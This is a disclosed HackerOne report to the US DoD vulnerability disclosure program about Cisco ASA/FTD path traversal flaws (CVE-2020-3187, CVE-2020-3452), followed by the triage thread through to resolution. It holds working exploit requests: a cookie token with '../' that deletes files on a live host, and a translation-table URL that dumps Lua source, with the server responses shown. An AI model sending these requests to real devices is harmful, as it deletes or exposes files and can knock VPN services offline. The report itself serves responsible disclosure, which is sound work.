{"id":1026265,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDI2MjY1","url":"https://hackerone.com/reports/1026265","title":"Unauthenticated Arbitrary File Deletion \"CVE-2020-3187\" in █████","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-11-04T22:22:37.364Z","submitted_at":"2020-11-04T22:22:37.383Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"emad777","url":"/emad777","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/333zTf5BgPE3gGuzTgR5ac93/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://www.dc3.mil/vulnerability-disclosure","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-23T18:01:30.239Z","bug_reporter_agreed_on_going_public_at":"2020-11-17T16:21:03.230Z","team_member_agreed_on_going_public_at":"2020-11-23T18:01:30.067Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\n\nA vulnerability in the interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files.\n\n**Description:**\n\nVulnerable host:\n`██████████`\n\n\n## Impact\n\nAn exploit could allow the attacker to view or delete arbitrary files on the system.\n\n## Step-by-step Reproduction Instructions\n\n1.Identifying vulnerable host by send request to /+CSCOE+/session_password.html.\n\ncurl -skiL \"███/+CSCOE+/session_password.html\"\n\n```\nGET /+CSCOE+/session_password.html HTTP/1.1\nHost: ███████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,ar;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: webvpnlogin=1; webvpnLang=en\nUpgrade-Insecure-Requests: 1\n```\n\nIf the target is vulnerable, the response header will display webvpn header, like:\nThe request gave me the following response\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 0\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Wed, 04 Nov 2020 21:40:44 GMT\nX-Frame-Options: SAMEORIGIN\nwebvpn:\n```\n\n**2.Perform exploits to delete files by adding token in cookie header request.**\n\nFor example, I wanted to delete this (██████/+CSCOU+/csco_logo.gif) file.\nThat did not work because sometimes logo.gif/png has permission issues so try this \"█████/+CSCOE+/blank.html\"\n\nYou can also delete the file \"/+CSCOE+/blank.html\" (an empty HTML file), as it might be a problem with the permission of the custom logo file sometimes logo.gif has permission issue so we might not be able to delete but we can delete other files\n\nRequest:\n\n```GET /+CSCOE+/blank.html HTTP/1.1\nHost: ██████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,ar;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: webvpnlogin=1; webvpnLang=en\nUpgrade-Insecure-Requests: 1```\n\nResponse:\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Wed, 04 Nov 2020 21:54:48 GMT\nX-Frame-Options: SAMEORIGIN\nContent-Length: 13\n\u003cHTML\u003e\u003c/HTML\u003e\n```\n\n**3. So I exploited the CVE and deleted the blank file. As following:**\n\nRequest:\n\n```\nGET /+CSCOE+/session_password.html HTTP/1.1\nHost: █████████\nCookie: token=../+CSCOE+/blank.html\nUser-Agent: curl/7.47.0\nAccept: */*\n```\n\nResponse:\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 0\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Wed, 04 Nov 2020 21:55:02 GMT\nX-Frame-Options: SAMEORIGIN\nwebvpn:\n ```\n\nFile deleted successfully:\n\n`curl -Ik ████/+CSCOE+/blank.html`\n```\nHTTP/1.1 404 Not Found\nCache-Control: no-cache\nPragma: no-cache\nConnection: Close\nDate: Wed, 04 Nov 2020 21:55:08 GMT\nX-Frame-Options: SAMEORIGIN\n\nFile not found\n```\n\nWarning : This can lead to a denial of service (DOS) on the VPN by deleting the lua source code files from the file system, which will break the WebVPN interface until the device is rebooted.\n\n## Suggested Mitigation/Remediation Actions\n\nUpgrade the ASA software version per the referenced advisory. This advisory is available at the following link:\n- https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43\n\n## Impact\n\n*High - This vulnerability allows the attacker to delete files within the web services file system.*","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eA vulnerability in the interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eVulnerable host:\u003cbr\u003e\n\u003ccode\u003e██████████\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn exploit could allow the attacker to view or delete arbitrary files on the system.\u003c/p\u003e\n\n\u003ch2 id=\"step-by-step-reproduction-instructions\"\u003eStep-by-step Reproduction Instructions\u003c/h2\u003e\n\n\u003cp\u003e1.Identifying vulnerable host by send request to /+CSCOE+/session_password.html.\u003c/p\u003e\n\n\u003cp\u003ecurl -skiL \u0026quot;███/+CSCOE+/session_password.html\u0026quot;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /+CSCOE+/session_password.html HTTP/1.1\nHost: ███████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,ar;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: webvpnlogin=1; webvpnLang=en\nUpgrade-Insecure-Requests: 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf the target is vulnerable, the response header will display webvpn header, like:\u003cbr\u003e\nThe request gave me the following response\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 0\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Wed, 04 Nov 2020 21:40:44 GMT\nX-Frame-Options: SAMEORIGIN\nwebvpn:\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003e2.Perform exploits to delete files by adding token in cookie header request.\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eFor example, I wanted to delete this (██████/+CSCOU+/csco_logo.gif) file.\u003cbr\u003e\nThat did not work because sometimes logo.gif/png has permission issues so try this \u0026quot;█████/+CSCOE+/blank.html\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eYou can also delete the file \u0026quot;/+CSCOE+/blank.html\u0026quot; (an empty HTML file), as it might be a problem with the permission of the custom logo file sometimes logo.gif has permission issue so we might not be able to delete but we can delete other files\u003c/p\u003e\n\n\u003cp\u003eRequest:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eGET /+CSCOE+/blank.html HTTP/1.1\u003cbr\u003e\nHost: ██████\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\u003cbr\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u003cbr\u003e\nAccept-Language: en-US,ar;q=0.7,en;q=0.3\u003cbr\u003e\nAccept-Encoding: gzip, deflate\u003cbr\u003e\nConnection: close\u003cbr\u003e\nCookie: webvpnlogin=1; webvpnLang=en\u003cbr\u003e\nUpgrade-Insecure-Requests: 1\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Wed, 04 Nov 2020 21:54:48 GMT\nX-Frame-Options: SAMEORIGIN\nContent-Length: 13\n\u0026lt;HTML\u0026gt;\u0026lt;/HTML\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003e3. So I exploited the CVE and deleted the blank file. As following:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eRequest:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /+CSCOE+/session_password.html HTTP/1.1\nHost: █████████\nCookie: token=../+CSCOE+/blank.html\nUser-Agent: curl/7.47.0\nAccept: */*\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 0\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Wed, 04 Nov 2020 21:55:02 GMT\nX-Frame-Options: SAMEORIGIN\nwebvpn:\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFile deleted successfully:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ecurl -Ik ████/+CSCOE+/blank.html\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 404 Not Found\nCache-Control: no-cache\nPragma: no-cache\nConnection: Close\nDate: Wed, 04 Nov 2020 21:55:08 GMT\nX-Frame-Options: SAMEORIGIN\n\nFile not found\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWarning : This can lead to a denial of service (DOS) on the VPN by deleting the lua source code files from the file system, which will break the WebVPN interface until the device is rebooted.\u003c/p\u003e\n\n\u003ch2 id=\"suggested-mitigation-remediation-actions\"\u003eSuggested Mitigation/Remediation Actions\u003c/h2\u003e\n\n\u003cp\u003eUpgrade the ASA software version per the referenced advisory. This advisory is available at the following link:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43\" href=\"/redirect?url=https%3A%2F%2Ftools.cisco.com%2Fsecurity%2Fcenter%2Fcontent%2FCiscoSecurityAdvisory%2Fcisco-sa-asaftd-path-JE3azWw43\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003e\u003cem\u003eHigh - This vulnerability allows the attacker to delete files within the web services file system.\u003c/em\u003e\u003c/p\u003e\n","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":6,"voters":["0xelkomy","t3chn0phil3","emad777","glgaitan","farmerted","emadmi6"],"severity":{"rating":"critical","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9732016,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Greetings,\n\nTo validate [your report] [the reported vulnerability], We require additional information.\n\nCan you please answer the following questions?\n\n…Are you still able to get to the site?  I have tried several browsers, curl, and networks with no luck.  Please let me know if you can still reach it and are able to download the transition table.\n\nI will continue processing your report on receipt of your response.  You will receive another status update upon completion of this review.  If I have any other questions in the interim, I will be back in touch.  \n\nIf we do not receive a response within two weeks, we will send you a second request for this information.  If we do not receive a response from you within two weeks of the second notice, we will have to close this report without action. \n\nIf you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards, ","markdown_message":"\u003cp\u003eGreetings,\u003c/p\u003e\n\n\u003cp\u003eTo validate [your report] [the reported vulnerability], We require additional information.\u003c/p\u003e\n\n\u003cp\u003eCan you please answer the following questions?\u003c/p\u003e\n\n\u003cp\u003e…Are you still able to get to the site?  I have tried several browsers, curl, and networks with no luck.  Please let me know if you can still reach it and are able to download the transition table.\u003c/p\u003e\n\n\u003cp\u003eI will continue processing your report on receipt of your response.  You will receive another status update upon completion of this review.  If I have any other questions in the interim, I will be back in touch.  \u003c/p\u003e\n\n\u003cp\u003eIf we do not receive a response within two weeks, we will send you a second request for this information.  If we do not receive a response from you within two weeks of the second notice, we will have to close this report without action. \u003c/p\u003e\n\n\u003cp\u003eIf you have any questions, please let me know.\u003c/p\u003e\n\n\u003cp\u003eThanks again for supporting the DoD Vulnerability Disclosure Program.\u003c/p\u003e\n\n\u003cp\u003eRegards, \u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T11:30:36.080Z","updated_at":"2020-11-05T11:30:36.080Z","actor":{"username":"agent-j5","cleared":false,"url":"/agent-j5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9735663,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi team,\n\nThe server right now returns a \"Secure Connection Failed\" error, and I am no longer can reach to the server.","markdown_message":"\u003cp\u003eHi team,\u003c/p\u003e\n\n\u003cp\u003eThe server right now returns a \u0026quot;Secure Connection Failed\u0026quot; error, and I am no longer can reach to the server.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T16:47:50.242Z","updated_at":"2020-11-05T16:47:50.242Z","actor":{"username":"emad777","cleared":false,"url":"/emad777","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/333zTf5BgPE3gGuzTgR5ac93/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9737063,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I tried sending the requests with burpsuite proxy, and it works!\n\nsee screenshots below.\n","markdown_message":"\u003cp\u003eI tried sending the requests with burpsuite proxy, and it works!\u003c/p\u003e\n\n\u003cp\u003esee screenshots below.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T17:37:45.271Z","updated_at":"2020-11-05T17:37:45.271Z","actor":{"username":"emad777","cleared":false,"url":"/emad777","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/333zTf5BgPE3gGuzTgR5ac93/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9737895,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"*Was able to exploit Path Traversal Vulnerability (CVE-2020-3452) and dump /+CSCOE+/portal_inc.lua file \nthrough translation-table endpoint.*\n\n```\n/+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026default-language\u0026lang=../\n```\n*To verify you cannot access this file normally, visit ████/+CSCOE+/portal_inc.lua and verify that you receive a page that says \"invalid file\".*\n\n\n**When I tried to dump the /+CSCOE+/portal_inc.lua through /translation-table endpoint I received the following response:**\n\n**Request:**\n\n```\nGET /+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026default-language\u0026lang=../ HTTP/1.1\nHost: █████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,ar;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://██████████/+CSCOE+/logon.html?fcadbadd=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\nOrigin: https://██████\nConnection: close\nCookie: webvpnlogin=1; webvpnLang=en\nUpgrade-Insecure-Requests: 1\n\n```\n\n\n**Response:**\n```\nHTTP/1.1 200 OK\nContent-Type: application/octet-stream\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Thu, 05 Nov 2020 18:29:32 GMT\nX-Frame-Options: SAMEORIGIN\nContent-Length: 27555\n\n-- Copyright (C) 2006-2018 by Cisco Systems, Inc.\n-- Created by otrizna@cisco.com\n\ndofile(\"/+CSCOE+/include/common.lua\")\ndofile(\"/+CSCOE+/include/browser_inc.lua\")\n\nlocal function compare(a,b) return a[\"order\"]\u003cb[\"order\"] end;\n\nfunction INTERNAL_PASSWORD_ENABLED(name)\n        return false;\nend\n\nfunction CONF_VIRTUAL_KEYBOARD(name)\n        return false;\nend\n\nno_inheritance = false\ncustom_profile=\"\"\nasdm_custom_file = \"\"\n\nfunction SetSessionData(index,name,value)\n\n   local f1\n   f1=io.open(\"/sessions/\"..index..\"/session_data\",\"w\")\n   if f1 then\n\tio.set_metadata_int(f1,name,value)\n\tf1:close()\n   end\t\n   \t\nend\n\nfunction GetSessionData(index,name,value)\n```\n\n**And when I tried to access the same file normally through /+CSCOE+/portal_inc.lua I got the following response:**\n\n**Request:**\n\n```\nGET /+CSCOE+/portal_inc.lua HTTP/1.1\nHost: ████████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,ar;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://██████████/+CSCOE+/logon.html?fcadbadd=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\nOrigin: https://████\nConnection: close\nCookie: webvpnlogin=1; webvpnLang=en\nUpgrade-Insecure-Requests: 1\n\n\n```\n\n**Response:**\n```\nHTTP/1.1 500 Internal Error\nCache-Control: no-cache\nPragma: no-cache\nConnection: Close\nDate: Thu, 05 Nov 2020 18:35:33 GMT\nX-Frame-Options: SAMEORIGIN\n\nInvalid file\n```\n\nSee screenshot below!\n\n*Note: All the requests above was sent by burpsuite due to the server error I am receiving, FYI this error was not exist before I submitted this report*\n\n**My Regards,**\n\nEmad\n","markdown_message":"\u003cp\u003e\u003cem\u003eWas able to exploit Path Traversal Vulnerability (CVE-2020-3452) and dump /+CSCOE+/portal_inc.lua file \u003cbr\u003e\nthrough translation-table endpoint.\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/+CSCOT+/translation-table?type=mst\u0026amp;textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026amp;default-language\u0026amp;lang=../\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cem\u003eTo verify you cannot access this file normally, visit ████/+CSCOE+/portal_inc.lua and verify that you receive a page that says \u0026quot;invalid file\u0026quot;.\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eWhen I tried to dump the /+CSCOE+/portal_inc.lua through /translation-table endpoint I received the following response:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRequest:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /+CSCOT+/translation-table?type=mst\u0026amp;textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026amp;default-language\u0026amp;lang=../ HTTP/1.1\nHost: █████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,ar;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://██████████/+CSCOE+/logon.html?fcadbadd=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\nOrigin: https://██████\nConnection: close\nCookie: webvpnlogin=1; webvpnLang=en\nUpgrade-Insecure-Requests: 1\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eResponse:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nContent-Type: application/octet-stream\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Thu, 05 Nov 2020 18:29:32 GMT\nX-Frame-Options: SAMEORIGIN\nContent-Length: 27555\n\n-- Copyright (C) 2006-2018 by Cisco Systems, Inc.\n-- Created by otrizna@cisco.com\n\ndofile(\u0026quot;/+CSCOE+/include/common.lua\u0026quot;)\ndofile(\u0026quot;/+CSCOE+/include/browser_inc.lua\u0026quot;)\n\nlocal function compare(a,b) return a[\u0026quot;order\u0026quot;]\u0026lt;b[\u0026quot;order\u0026quot;] end;\n\nfunction INTERNAL_PASSWORD_ENABLED(name)\n        return false;\nend\n\nfunction CONF_VIRTUAL_KEYBOARD(name)\n        return false;\nend\n\nno_inheritance = false\ncustom_profile=\u0026quot;\u0026quot;\nasdm_custom_file = \u0026quot;\u0026quot;\n\nfunction SetSessionData(index,name,value)\n\n   local f1\n   f1=io.open(\u0026quot;/sessions/\u0026quot;..index..\u0026quot;/session_data\u0026quot;,\u0026quot;w\u0026quot;)\n   if f1 then\n    io.set_metadata_int(f1,name,value)\n    f1:close()\n   end  \n\nend\n\nfunction GetSessionData(index,name,value)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eAnd when I tried to access the same file normally through /+CSCOE+/portal_inc.lua I got the following response:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRequest:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /+CSCOE+/portal_inc.lua HTTP/1.1\nHost: ████████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,ar;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://██████████/+CSCOE+/logon.html?fcadbadd=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\nOrigin: https://████\nConnection: close\nCookie: webvpnlogin=1; webvpnLang=en\nUpgrade-Insecure-Requests: 1\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eResponse:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 500 Internal Error\nCache-Control: no-cache\nPragma: no-cache\nConnection: Close\nDate: Thu, 05 Nov 2020 18:35:33 GMT\nX-Frame-Options: SAMEORIGIN\n\nInvalid file\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSee screenshot below!\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eNote: All the requests above was sent by burpsuite due to the server error I am receiving, FYI this error was not exist before I submitted this report\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eMy Regards,\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eEmad\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T18:51:15.014Z","updated_at":"2020-11-23T18:00:43.131Z","actor":{"username":"emad777","cleared":false,"url":"/emad777","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/333zTf5BgPE3gGuzTgR5ac93/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9738254,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-11-05T19:46:54.970Z","updated_at":"2020-11-05T19:46:54.970Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":898415},"actor":{"username":"agent-j5","cleared":false,"url":"/agent-j5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9738255,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","markdown_message":"\u003cp\u003eGreetings,\u003c/p\u003e\n\n\u003cp\u003eWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\u003c/p\u003e\n\n\u003cp\u003eThank you for bringing this vulnerability to our attention!\u003c/p\u003e\n\n\u003cp\u003eWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\u003c/p\u003e\n\n\u003cp\u003eYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\u003c/p\u003e\n\n\u003cp\u003eThanks again for supporting the DoD Vulnerability Disclosure Program.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eThe VDP Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T19:46:56.139Z","updated_at":"2020-11-05T19:46:56.139Z","actor":{"username":"agent-j5","cleared":false,"url":"/agent-j5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9845795,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","markdown_message":"\u003cp\u003eGood news!\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\u003c/p\u003e\n\n\u003cp\u003eThank you for your time and effort to improve the security of the DoD information network.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eThe VDP 